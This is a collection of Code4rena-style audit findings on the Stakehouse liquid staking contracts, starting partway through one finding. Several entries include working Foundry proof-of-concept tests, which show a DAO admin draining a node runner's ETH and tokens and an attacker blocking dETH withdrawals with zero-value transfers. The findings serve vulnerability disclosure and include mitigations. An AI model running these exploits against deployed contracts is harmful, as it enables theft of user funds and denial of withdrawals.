Recommended Mitigation Steps Send back outstanding ETH and rewards that belongs to node runner if swapping is needed. 
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L202 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L210 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L426 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L460 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L63   # Vulnerability details  ## Impact  Dao admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund via arbitrary execution.  ## Proof of Concept  After the Liquid Staking Manager.so is deployed via LSDNFactory::deployNewLiquidStakingDerivativeNetwork,  ```solidity /// @notice Deploys a new LSDN and the liquid staking manger required to manage the network /// @param _dao Address of the entity that will govern the liquid staking network /// @param _stakehouseTicker Liquid staking derivative network ticker (between 3-5 chars) function deployNewLiquidStakingDerivativeNetwork(  address _dao,  uint256 _optionalCommission,  bool _deployOptionalHouseGatekeeper,  string calldata _stakehouseTicker ) public returns (address) { ```  The dao address governance address (contract) has very high privilege.  The dao address can perform arbitrary execution by calling LiquidStakingManager.sol::executeAsSmartWallet  ```solidity /// @notice Enable operations proxied through DAO contract to another contract /// @param _nodeRunner Address of the node runner that created the wallet /// @param _to Address of the target contract /// @param _data Encoded data of the function call /// @param _value Total value attached to the transaction function executeAsSmartWallet(  address _nodeRunner,  address _to,  bytes calldata _data,  uint256 _value ) external payable onlyDAO {  address smartWallet = smartWalletOfNodeRunner[_nodeRunner];  require(smartWallet != address(0), "No wallet found");  IOwnableSmartWallet(smartWallet).execute(   _to,   _data,   _value  ); } ```  When a register a new node operator with 4 ETH by calling registerBLSPublicKeys:  ```solidity /// @notice register a node runner to LSD by creating a new smart wallet /// @param _blsPublicKeys list of BLS public keys /// @param _blsSignatures list of BLS signatures /// @param _eoaRepresentative EOA representative of wallet function registerBLSPublicKeys(  bytes[] calldata _blsPublicKeys,  bytes[] calldata _blsSignatures,  address _eoaRepresentative ) external payable nonReentrant { ```  the smart wallet created in the smart contract custody the 4 ETH.  ```solidity // create new wallet owned by liquid staking manager smartWallet = smartWalletFactory.createWallet(address(this)); emit SmartWalletCreated(smartWallet, msg.sender); ```  ```solidity {  // transfer ETH to smart wallet  (bool result,) = smartWallet.call{value: msg.value}("");  require(result, "Transfer failed");  emit WalletCredited(smartWallet, msg.value); } ```  but  Dao admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund in the smart wallet via arbitrary execution.  **As shown in POC:**  first we add this smart contract in LiquidStakingManager.t.sol  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12  ```solidity import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";  contract RugContract {      function receiveFund() external payable {      }      receive() external payable {} }  contract MockToken is ERC20 {      constructor()ERC20("A", "B") {         _mint(msg.sender, 10000 ether);     }  } ```  **We add the two POC,**   https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35  the first POC shows the admin can steal the ETH from the smart contract via arbrary execution.  ```solidity     function testDaoRugFund_Pull_ETH_POC() public {                  address user = vm.addr(21312);          bytes[] memory publicKeys = new bytes[](1);         publicKeys[0] = "publicKeys";          bytes[] memory signature = new bytes[](1);         signature[0] = "signature";          RugContract rug = new RugContract();          // user spends 4 ehter and register the key to become the public operator         vm.prank(user);         vm.deal(user, 4 ether);         manager.registerBLSPublicKeys{value: 4 ether}(             publicKeys,             signature,             user         );         address wallet = manager.smartWalletOfNodeRunner(user);         console.log("wallet ETH balance for user after registering");         console.log(wallet.balance);          // dao admin rug the user by withdraw the ETH via arbitrary execution.         vm.prank(admin);         bytes memory data = abi.encodeWithSelector(RugContract.receiveFund.selector, "");         manager.executeAsSmartWallet(             user,             address(rug),             data,             4 ether         );         console.log("wallet ETH balance for user after DAO admin rugging");         console.log(wallet.balance);      } ```  We run the test:  ```solidity forge test -vv --match testDaoRugFund_Pull_ETH_POC ```  the result is  ```solidity Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [PASS] testDaoRugFund_Pull_ETH_POC() (gas: 353826) Logs:   wallet ETH balance for user after registering   4000000000000000000   wallet ETH balance for user after DAO admin rugging   0  Test result: ok. 1 passed; 0 failed; finished in 13.63ms ```  the second POC shows the admin can steal the ERC20 token from the smart contract via arbrary execution.  ```solidity     function testDaoRugFund_Pull_ERC20_Token_POC() public {          address user = vm.addr(21312);          bytes[] memory publicKeys = new bytes[](1);         publicKeys[0] = "publicKeys";          bytes[] memory signature = new bytes[](1);         signature[0] = "signature";          RugContract rug = new RugContract();          vm.prank(user);         vm.deal(user, 4 ether);         manager.registerBLSPublicKeys{value: 4 ether}(             publicKeys,             signature,             user         );          address wallet = manager.smartWalletOfNodeRunner(user);         ERC20 token = new MockToken();         token.transfer(wallet, 100 ether);          console.log("wallet ERC20 token balance for user after registering");         console.log(token.balanceOf(wallet));          vm.prank(admin);         bytes memory data = abi.encodeWithSelector(IERC20.transfer.selector, address(rug), 100 ether);         manager.executeAsSmartWallet(             user,             address(token),             data,             0         );          console.log("wallet ERC20 token balance for dao rugging");         console.log(token.balanceOf(wallet));      } ```  We run the test:  ```solidity forge test -vv --match testDaoRugFund_Pull_ERC20_Token_POC ```  the running result is  ```solidity Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [PASS] testDaoRugFund_Pull_ERC20_Token_POC() (gas: 940775) Logs:   wallet ERC20 token balance for user after registering   100000000000000000000   wallet ERC20 token balance for dao rugging   0  Test result: ok. 1 passed; 0 failed; finished in 16.99ms ```   ## Tools Used  Manual Review, Foundry  ## Recommended Mitigation Steps  We recommend not give the dao admin the priviledge to perform arbitrary execution to access user's fund.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L94 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L105-L106   # Vulnerability details  ## Impact The `OwnableSmartWallet` contract employs a mechanism for the owner to approve addresses that can then claim ownership ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L94](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L94)) of the contract.    The source code has a comment included which states that "Approval is revoked, in order to avoid unintended transfer allowance if this wallet ever returns to the previous owner" ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L105-L106](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L105-L106)).    This means that when ownership is transferred from User A to User B, the approvals that User A has given should be revoked.    The existing code does not however revoke all approvals that User A has given. It only revokes one approval.    This can lead to unwanted transfers of ownership.    ## Proof of Concept 1. User A approves User B and User C to claim ownership 2. User B claims ownership first 3. Only User A's approval for User B is revoked, not however User A's approval for User C 4. User B transfers ownerhsip back to User A 5. Now User C can claim ownership even though this time User A has not approved User C  ## Tools Used VSCode  ## Recommended Mitigation Steps You should invalidate all approvals User A has given when another User becomes the owner of the OwnableSmartWallet.    Unfortunately you cannot use a statement like `delete _isTransferApproved[owner()]`.    So you would need an array that keeps track of approvals as pointed out in this StackExchange question: [https://ethereum.stackexchange.com/questions/15553/how-to-delete-a-mapping](https://ethereum.stackexchange.com/questions/15553/how-to-delete-a-mapping)   
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L95   # Vulnerability details  ## Impact The `GiantPoolBase.withdrawLPTokens` function ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69)) allows to withdraw LP tokens from a GiantPool by burning an equal amount of GiantLP.    This allows a user to handle the LP tokens directly without the need for a GiantPool as intermediary.    It is not checked however whether the LP tokens to be withdrawn were transferred to the GiantPool in exchange for staking ETH.    I.e. whether the LP token are of any value.    There are two issues associated with this behavior.    1. A malicious user can create and mint his own LP Token and send it to the GiantPool. Users that want to withdraw LP tokens from the GiantPool can then be tricked into withdrawing worthless attacker LP tokens, thereby burning their GiantLP tokens that are mapped 1:1 to  ETH. (-> loss of funds)    2. This can also mess up internal accounting logic. For every LP token that is owned by a GiantPool there should be a corresponding GiantLP token. Using the described behavior this ratio can be broken such that there are LP token owned by the GiantPool for which there is no GiantLP token. This means some LP token cannot be transferred from the GiantPool and there will always be some amount of LP token "stuck" in the GiantPool.    ## Proof of Concept 1. The attacker deploys his own LPToken contract and sends a huge amount of LP tokens to the GiantPool to pass the check in `GiantPoolBase._assertUserHasEnoughGiantLPToClaimVaultLP` ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L95](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L95)).  2. The attacker tricks Bob into withdrawing the malicious LP tokens from the GiantPool ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69)).  3. Bob's GiantLP tokens are burnt and he receives worthless LP tokens.  The same issue exists for the `GiantSavETHVaultPool.withdrawDETH` function.   But in this case, the victim must also provide a wrong savETHVault address which makes this issue less likely to be exploited.    ## Tools Used VSCode  ## Recommended Mitigation Steps The GiantPool should store information about which LP tokens it receives for staking ETH.  When calling the `GiantPoolBase.withdrawLPTokens` function it can then be checked if the LP tokens to be withdrawn were indeed transferred to the GiantPool in exchange for staking ETH.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L53   # Vulnerability details  ## Impact The `GiantPoolBase.withdrawETH` function requires that the amount to withdraw is at least as big as the `MIN_STAKING_AMOUNT` ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L53](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L53)).    This check does not serve any purpose and can actually cause the user problems when withdrawing his ETH.    ## Proof of Concept 1. Bob deposits ETH into the GiantPool with the `GiantPoolBase.depositETH` function.      The amount is equal to `MIN_STAKING_AMOUNT + 0.99 * MIN_STAKING_AMOUNT`. 2. Bob witdraws `MIN_STAKING_AMOUNT` ETH from the GiantPool.   3. Bob has `0.99 * MIN_STAKING_AMOUNT` ETH left in the GiantPool. This is a problem since he cannot withdraw this amount of ETH since it is smaller than `MIN_STAKING_AMOUNT`.      In order to withdraw his funds, Bob needs to first add funds to the GiantPool such that the deposited amount is big enough for withdrawal.  However this causes extra transaction fees to be paid (loss of funds) and causes a bad user experience.    ## Tools Used VSCode  ## Recommended Mitigation Steps The `require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");` statement should just be removed. It does not serve any purpose anyway.  
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L245   # Vulnerability details  ## Impact  If a user stakes some sETH, and after some time decides to unstake some amount of sETH, later s/he will not be qualified or be less qualified to claim ETH on the remaining staked sETH.  ## Proof of Concept  Suppose Alice stakes 5 sETH by calling `stake(...)`. https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L203 So, we will have:  -  `sETHUserClaimForKnot[BLS][Alice] = (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION`  - `sETHStakedBalanceForKnot[BLS][Alice] = 5 * 10^18`  - `sETHTotalStakeForKnot[BLS] += 5 * 10^18`  Later, Alice decides to unstake 3 sETH by calling `unstake(...)`. https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L245  So, all ETH owed to Alice will be paid: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L257  Then, we will have:  -  `sETHUserClaimForKnot[BLS][Alice] = (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION`  - `sETHStakedBalanceForKnot[BLS][Alice] = 2 * 10^18`  - `sETHTotalStakeForKnot[BLS] -= 3 * 10^18`  It is clear that the mapping `sETHStakedBalanceForKnot` is decreased as expected, but the mapping `sETHUserClaimForKnot` is not changed. In other words, the mapping `sETHUserClaimForKnot` is still holding the claimed amount based on the time 5 sETH were staked.  If, after some time, the ETH is accumulated per free floating share for the BLS public key that Alice was staking for, Alice will be qualified to some more ETH to claim (because she has still 2 sETH staked).   If Alice unstakes by calling `unstake(...)` or claim ETH by calling `claimAsStaker(...)`, in both calls, the function `calculateUnclaimedFreeFloatingETHShare` will be called to calculate the amount of unclaimed ETH: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L652  In this function, we will have:  - `stakedBal = sETHStakedBalanceForKnot[BLS][Alice]` = 2 * 10^18  - `userShare = (newAccumulatedETHPerShare * stakedBal) / PRECISION`   The return value which is unclaimed ETH will be: ``` userShare - sETHUserClaimForKnot[BLS][Alice] =  (newAccumulatedETHPerShare * 2 * 10^18) / PRECISION - (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION ```  This return value is not correct (it is highly possible to be smaller than 0, and as a result Alice can not claim anything), because the claimed ETH is still based on the time when 5 sETH were staked, not on the time when 2 sETH were remaining/staked.  The vulnerability is that during unstaking, the mapping `sETHUserClaimForKnot` is not updated to the correct value. In other words, this mapping is updated in `_claimAsStaker`, but it is updated based on 5 sETH staked, later when 3 sETH are unstaked, this mapping should be again updated based on the remaing sETH (which is 2 sETH).  As a result, Alice can not claim ETH or she will qualify for less amount.  ## Tools Used  ## Recommended Mitigation Steps The following line should be added on line 274: ``` sETHUserClaimForKnot[_blsPubKey][msg.sender] =                 (accumulatedETHPerShare * sETHStakedBalanceForKnot[_blsPubKey][msg.sender]) / PRECISION ```  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L274
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126   # Vulnerability details  ## Impact  Both giant pools are affected: 1. GiantSavETHVaultPool 2. bringUnusedETHBackIntoGiantPool   The giant pools have a `bringUnusedETHBackIntoGiantPool` function that calls the vaults to send back any unused ETH. Currently, any call to this function will revert. Unused ETH will not be sent to the giant pools and will stay in the vaults.  This causes an insolvency issue when many users want to withdraw ETH and there is not enough liquidity inside the giant pools.  ## Proof of Concept  `bringUnusedETHBackIntoGiantPool` calls the vaults to receive ETH: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137 ```     function bringUnusedETHBackIntoGiantPool(         address[] calldata _savETHVaults,         LPToken[][] calldata _lpTokens,         uint256[][] calldata _amounts     ) external {         uint256 numOfVaults = _savETHVaults.length;         require(numOfVaults > 0, "Empty arrays");         require(numOfVaults == _lpTokens.length, "Inconsistent arrays");         require(numOfVaults == _amounts.length, "Inconsistent arrays");         for (uint256 i; i < numOfVaults; ++i) {             SavETHVault vault = SavETHVault(_savETHVaults[i]);             for (uint256 j; j < _lpTokens[i].length; ++j) {                 require(                     vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,                     "ETH is either staked or derivatives minted"                 );             }             vault.burnLPTokens(_lpTokens[i], _amounts[i]);         }     } ```  the vaults go through a process of burning the `_lpTokens` and sending the caller giant pool ETH.  `burnLPToken` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126 ```     function burnLPToken(LPToken _lpToken, uint256 _amount) public nonReentrant returns (uint256) {         /// .....         (bool result,) = msg.sender.call{value: _amount}("");         // .....     } ```  Giant pools do not have a `fallback` or `receive` function. ETH cannot be sent to them  additionally, there is no accounting of `idleETH`, which should be increased with the received ETH in order to facilitate withdraws  ## Tools Used  VS Code  ## Recommended Mitigation Steps  1. Add a `fallback` or `receive` function to the pools. 2. `idleETH` should be increased with the received ETH 
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76   # Vulnerability details  ## Impact  It is possible to rotate `LPTokens` to a banned BLS public key. This is not a safe action, because it can result in insolvency of the project (specially if the banned BLS public key was malicious).  ## Proof of Concept  When a user deposits ETH for staking by calling `depositETHForStaking`, the manager checks whether the provided BLS public key is banned or not. `require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, "BLS public key is banned or not a part of LSD network");` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L113  If it is not banned the `LPToken` related to that BLS public key will be minted to the caller, so the number of `LPToken` related to that BLS public key will be increased.  https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/liquid-staking/ETHPoolLPFactory.sol#L125  If it is banned, it will not be possible to stake to this BLS public key, so the number of `LPToken` will not be increased. But the issue is that it is still possible to increase the `LPToken` of this BLS public key through rotating `LPToken`.   In other words, a malicious user can call `rotateLPTokens`, so that the `_oldLPToken` will be migrated to `_newLPToken` which is equal to the `LPToken` related to the banned BLS public key.  In summary, the vulnerability is that during rorating `LPTokens`, it is not checked that the `_newLPToken` is related to a banned BLS public key or not.  ## Tools Used  ## Recommended Mitigation Steps The following line should be added to function `rotateLPTokens(...)`: `require(liquidStakingNetworkManager.isBLSPublicKeyBanned(blsPublicKeyOfNewKnot ) == false, "BLS public key is banned or not a part of LSD network");` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L96   # Vulnerability details  ## Impact  A hacker can prevent users from withdrawing dETH or LPTokens in giant pools.  This bug causes a revert in: 1. `WithdrawLP` - `GiantMevAndFeesPool` 2. `WithdrawLP` - `GiantSavETHVaultPool` 3. `WithdrawDETH` - `GiantSavETHVaultPool`  A hacker can prevent a user from receiving dETH when users are eligible and guaranteed to receive it through their stake.  This causes a liquidity crunch as the only funds that are possible to withdraw are ETH. There is not enough ETH in the giant pools to facilitate a large withdraw as ETH is staked for LPTokens and dETH.  The giant pools will become insolvent to returning ETH, dETH or vault LPTokens.  ## Proof of Concept  Both `WithdrawLP` and `WithdrawDETH` act in a similar way: 1. loop LPtokens received for withdraw 2. Check user has enough Giant LP tokens to burn and pool has enough vault LP to give. 3. Check that a day has passed since user has interacted with Giant LP Token 4. burn tokens 5. send tokens  Example of `WithdrawDETH`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66 ```     function withdrawDETH(         address[] calldata _savETHVaults,         LPToken[][] calldata _lpTokens,         uint256[][] calldata _amounts     ) external {         uint256 numOfVaults = _savETHVaults.length;         require(numOfVaults > 0, "Empty arrays");         require(numOfVaults == _lpTokens.length, "Inconsistent arrays");         require(numOfVaults == _amounts.length, "Inconsistent arrays");          // Firstly capture current dETH balance and see how much has been deposited after the loop         uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));         for (uint256 i; i < numOfVaults; ++i) {             SavETHVault vault = SavETHVault(_savETHVaults[i]);              // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user             for (uint256 j; j < _lpTokens[i].length; ++j) {                 LPToken token = _lpTokens[i][j];                 uint256 amount = _amounts[i][j];                  // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP                 _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);                  require(vault.isDETHReadyForWithdrawal(address(token)), "dETH is not ready for withdrawal");                  // Giant LP is burned 1:1 with LPs from sub-networks                 require(lpTokenETH.balanceOf(msg.sender) >= amount, "User does not own enough LP");                  // Burn giant LP from user before sending them dETH                 lpTokenETH.burn(msg.sender, amount);                  emit LPBurnedForDETH(address(token), msg.sender, amount);             }              // Ask             vault.burnLPTokens(_lpTokens[i], _amounts[i]);         }          // Calculate how much dETH has been received from burning         dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;          // Send giant LP holder dETH owed         getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);     } ```  The bug is in `_assertUserHasEnoughGiantLPToClaimVaultLP` in the last require that checks that a day has passed since the user has interacted with Giant LP Token: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L93 ```     function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {         require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");         require(_token.balanceOf(address(this)) >= _amount, "Pool does not own specified LP");         require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, "Too new");     } ```  The condition `lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp` can be set to fail by the hacker. The hacker  transfers 0 `lpTokenETH` tokens to  `msg.sender`. This transfer will update the `lastInteractedTimestamp` to now.  The above can be done once a day or on-demand by front-running the withdraw commands.  `_afterTokenTransfer` in `GiantLP.sol`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L43 ```     function _afterTokenTransfer(address _from, address _to, uint256 _amount) internal override {         lastInteractedTimestamp[_from] = block.timestamp;         lastInteractedTimestamp[_to] = block.timestamp;         if (address(transferHookProcessor) != address(0)) ITransferHookProcessor(transferHookProcessor).afterTokenTransfer(_from, _to, _amount);     } ``` ### Foundry POC  The POC will show how a hacker prevents a user from receiving dETH although they are eligible to receive it.  Add the following test to `GiantPools.t.sol`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/GiantPools.t.sol#L118 ```     function testPreventWithdraw() public {         // Set up users and ETH         address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);         address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);         address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);          // Register BLS key         registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);          // Deposit 24 ETH into giant savETH         vm.prank(savETHUser);         giantSavETHPool.depositETH{value: 24 ether}(24 ether);         assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);         assertEq(address(giantSavETHPool).balance, 24 ether);          // Deploy 24 ETH from giant LP into savETH pool of LSDN instance         bytes[][] memory blsKeysForVaults = new bytes[][](1);         blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);          uint256[][] memory stakeAmountsForVaults = new uint256[][](1);         stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);          giantSavETHPool.batchDepositETHForStaking(             getAddressArrayFromValues(address(manager.savETHVault())),             getUint256ArrayFromValues(24 ether),             blsKeysForVaults,             stakeAmountsForVaults         );         assertEq(address(manager.savETHVault()).balance, 24 ether);          // Deposit 4 ETH into giant fees and mev         vm.startPrank(feesAndMevUserOne);         giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);         vm.stopPrank();          assertEq(address(giantFeesAndMevPool).balance, 4 ether);         stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);         giantFeesAndMevPool.batchDepositETHForStaking(             getAddressArrayFromValues(address(manager.stakingFundsVault())),             getUint256ArrayFromValues(4 ether),             blsKeysForVaults,             stakeAmountsForVaults         );          // Ensure we can stake and mint derivatives         stakeAndMintDerivativesSingleKey(blsPubKeyOne);          IERC20 dETHToken = savETHVault.dETHToken();          vm.startPrank(accountFive);         dETHToken.transfer(address(savETHVault.saveETHRegistry()), 24 ether);         vm.stopPrank();          LPToken[] memory tokens = new LPToken[](1);         tokens[0] = savETHVault.lpTokenForKnot(blsPubKeyOne);          LPToken[][] memory allTokens = new LPToken[][](1);         allTokens[0] = tokens;          stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);          // User will not have any dETH to start         assertEq(dETHToken.balanceOf(savETHUser), 0);          // Warp ahead -> savETHUser eligible to dETH         vm.warp(block.timestamp + 2 days);          // Send 0 tokens to savETHUser so he cannot withdrawDETH         address hacker = address(0xdeadbeef);         vm.startPrank(hacker);         giantSavETHPool.lpTokenETH().transfer(savETHUser, 0);         vm.stopPrank();         address[] memory addresses = getAddressArrayFromValues(address(manager.savETHVault()));          vm.startPrank(savETHUser);         // Validate withdrawDETH will revert           vm.expectRevert("Too new");         giantSavETHPool.withdrawDETH(addresses, allTokens, stakeAmountsForVaults);         vm.stopPrank();         } ```  To run the POC execute:  `yarn test -m "PreventWithdraw" -v`  Expected output:  ``` Running 1 test for test/foundry/GiantPools.t.sol:GiantPoolTests [PASS] testPreventWithdraw() (gas: 3132637) Test result: ok. 1 passed; 0 failed; finished in 9.25ms ```  To run with full trace, execute: `yarn test -m "PreventWithdraw" -vvvv`  ## Tools Used  VS Code, Foundry  ## Recommended Mitigation Steps  Make sure transfers in the GiantLP are only for funds larger than (0.001 ETH), this will make the exploitation expensive.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L369 https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L668 https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L228   # Vulnerability details  ## Impact  A malicious user can steal all claimable ETH belonging to free floating SLOT holders...  ## Proof of Concept  https://gist.github.com/clems4ever/f1149743897b2620eab0734f88208603  run it in the test suite with forge  ## Tools Used  Manual review / forge  ## Recommended Mitigation Steps  += operator instead of =    in https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L228 ?  The logic for keeping the rewards up-to-date is also quite complex in my opinion. The main thing that triggered it for me was the lazy call to `updateAccruedETHPerShares`. Why not keeping the state updated after each operation instead?
